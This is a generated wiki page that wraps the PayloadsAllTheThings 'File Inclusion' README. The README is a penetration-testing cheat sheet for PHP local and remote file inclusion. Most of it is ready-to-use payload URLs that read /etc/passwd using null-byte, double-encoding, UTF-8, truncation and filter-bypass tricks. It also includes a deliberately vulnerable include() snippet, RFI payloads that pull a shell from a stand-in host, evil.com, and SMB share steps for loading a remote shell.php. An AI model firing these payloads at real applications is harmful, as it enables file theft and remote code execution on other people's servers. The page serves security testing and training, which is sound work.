---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# File Inclusion

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-file-inclusion-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/File Inclusion/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [File Inclusion](../../topics/file-inclusion/file-inclusion.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-file-inclusion-readme |
| name | File Inclusion |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md |

## Preserved Source Material

````yaml
_body: "# File Inclusion\n\n> A File Inclusion Vulnerability refers to a type of security vulnerability in web applications,\
  \ particularly prevalent in applications developed in PHP, where an attacker can include a file, usually exploiting a lack\
  \ of proper input/output sanitization. This vulnerability can lead to a range of malicious activities, including code execution,\
  \ data theft, and website defacement.\n\n## Summary\n\n- [Tools](#tools)\n- [Local File Inclusion](#local-file-inclusion)\n\
  \    - [Null Byte](#null-byte)\n    - [Double Encoding](#double-encoding)\n    - [UTF-8 Encoding](#utf-8-encoding)\n   \
  \ - [Path Truncation](#path-truncation)\n    - [Filter Bypass](#filter-bypass)\n- [Remote File Inclusion](#remote-file-inclusion)\n\
  \    - [Null Byte](#null-byte-1)\n    - [Double Encoding](#double-encoding-1)\n    - [Bypass allow_url_include](#bypass-allow_url_include)\n\
  - [Labs](#labs)\n- [References](#references)\n\n## Tools\n\n- [P0cL4bs/Kadimus](https://github.com/P0cL4bs/Kadimus) (archived\
  \ on Oct 7, 2020) - kadimus is a tool to check and exploit lfi vulnerability.\n- [D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite)\
  \ - Totally Automatic LFI Exploiter (+ Reverse Shell) and Scanner\n- [kurobeats/fimap](https://github.com/kurobeats/fimap)\
  \ - fimap is a little python tool which can find, prepare, audit, exploit and even google automatically for local and remote\
  \ file inclusion bugs in webapps.\n- [lightos/Panoptic](https://github.com/lightos/Panoptic) - Panoptic is an open source\
  \ penetration testing tool that automates the process of search and retrieval of content for common log and config files\
  \ through path traversal vulnerabilities.\n- [hansmach1ne/LFImap](https://github.com/hansmach1ne/LFImap) - Local File Inclusion\
  \ discovery and exploitation tool\n\n## Local File Inclusion\n\n**File Inclusion Vulnerability** should be differentiated\
  \ from **Path Traversal**. The Path Traversal vulnerability allows an attacker to access a file, usually exploiting a \"\
  reading\" mechanism implemented in the target application, when the File Inclusion will lead to the execution of arbitrary\
  \ code.\n\nConsider a PHP script that includes a file based on user input. If proper sanitization is not in place, an attacker\
  \ could manipulate the `page` parameter to include local or remote files, leading to unauthorized access or code execution.\n\
  \n```php\n<?php\n$file = $_GET['page'];\ninclude($file);\n?>\n```\n\nIn the following examples we include the `/etc/passwd`\
  \ file, check the `Directory & Path Traversal` chapter for more interesting files.\n\n```powershell\nhttp://example.com/index.php?page=../../../etc/passwd\n\
  ```\n\n### Null Byte\n\n:warning: In versions of PHP below 5.3.4 we can terminate with null byte (`%00`).\n\n```powershell\n\
  http://example.com/index.php?page=../../../etc/passwd%00\n```\n\n**Example**: Joomla! Component Web TV 1.0 - CVE-2010-1470\n\
  \n```ps1\n{{BaseURL}}/index.php?option=com_webtv&controller=../../../../../../../../../../etc/passwd%00\n```\n\n### Double\
  \ Encoding\n\n```powershell\nhttp://example.com/index.php?page=%252e%252e%252fetc%252fpasswd\nhttp://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00\n\
  ```\n\n### UTF-8 Encoding\n\n```powershell\nhttp://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd\n\
  http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00\n```\n\n### Path Truncation\n\nOn\
  \ most PHP installations a filename longer than `4096` bytes will be cut off so any excess chars will be thrown away.\n\n\
  ```powershell\nhttp://example.com/index.php?page=../../../etc/passwd............[ADD MORE]\nhttp://example.com/index.php?page=../../../etc/passwd\\\
  .\\.\\.\\.\\.\\.[ADD MORE]\nhttp://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] \nhttp://example.com/index.php?page=../../../[ADD\
  \ MORE]../../../../etc/passwd\n```\n\n### Filter Bypass\n\n```powershell\nhttp://example.com/index.php?page=....//....//etc/passwd\n\
  http://example.com/index.php?page=..///////..////..//////etc/passwd\nhttp://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd\n\
  ```\n\n## Remote File Inclusion\n\n> Remote File Inclusion (RFI) is a type of vulnerability that occurs when an application\
  \ includes a remote file, usually through user input, without properly validating or sanitizing the input.\n\nRemote File\
  \ Inclusion doesn't work anymore on a default configuration since `allow_url_include` is now disabled since PHP 5.\n\n```ini\n\
  allow_url_include = On\n```\n\nMost of the filter bypasses from LFI section can be reused for RFI.\n\n```powershell\nhttp://example.com/index.php?page=http://evil.com/shell.txt\n\
  ```\n\n### Null Byte\n\n```powershell\nhttp://example.com/index.php?page=http://evil.com/shell.txt%00\n```\n\n### Double\
  \ Encoding\n\n```powershell\nhttp://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt\n```\n\n### Bypass\
  \ allow_url_include\n\nWhen `allow_url_include` and `allow_url_fopen` are set to `Off`. It is still possible to include\
  \ a remote file on Windows box using the `smb` protocol.\n\n1. Create a share open to everyone\n2. Write a PHP code inside\
  \ a file : `shell.php`\n3. Include it `http://example.com/index.php?page=\\\\10.0.0.1\\share\\shell.php`\n\n## Labs\n\n\
  - [Root Me - Local File Inclusion](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion)\n- [Root Me -\
  \ Local File Inclusion - Double encoding](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Double-encoding)\n\
  - [Root Me - Remote File Inclusion](https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion)\n- [Root Me\
  \ - PHP - Filters](https://www.root-me.org/en/Challenges/Web-Server/PHP-Filters)\n\n## References\n\n- [CVV #1: Local File\
  \ Inclusion - SI9INT - June 20, 2018](https://web.archive.org/web/20200724150218/https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a)\n\
  - [Exploiting Remote File Inclusion (RFI) in PHP application and bypassing remote URL inclusion restriction - Mannu Linux\
  \ - May 12, 2019](https://web.archive.org/web/20260220172333/https://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html)\n\
  - [Is PHP vulnerable and under what conditions? - Andreas Venieris - April 13, 2015](https://web.archive.org/web/20250209181954/http://0x191unauthorized.blogspot.fr/2015/04/is-php-vulnerable-and-under-what.html)\n\
  - [LFI Cheat Sheet - @Arr0way - April 24, 2016](https://web.archive.org/web/20180121083456/https://highon.coffee/blog/lfi-cheat-sheet/)\n\
  - [Testing for Local File Inclusion - OWASP - June 25, 2017](https://web.archive.org/web/20131021005706/https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion)\n\
  - [Turning LFI into RFI - Grayson Christopher - August 14, 2017](https://web.archive.org/web/20170815004721/https://l.avala.mp/?p=241)"
_relative_path: File Inclusion/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/File Inclusion/README.md
````
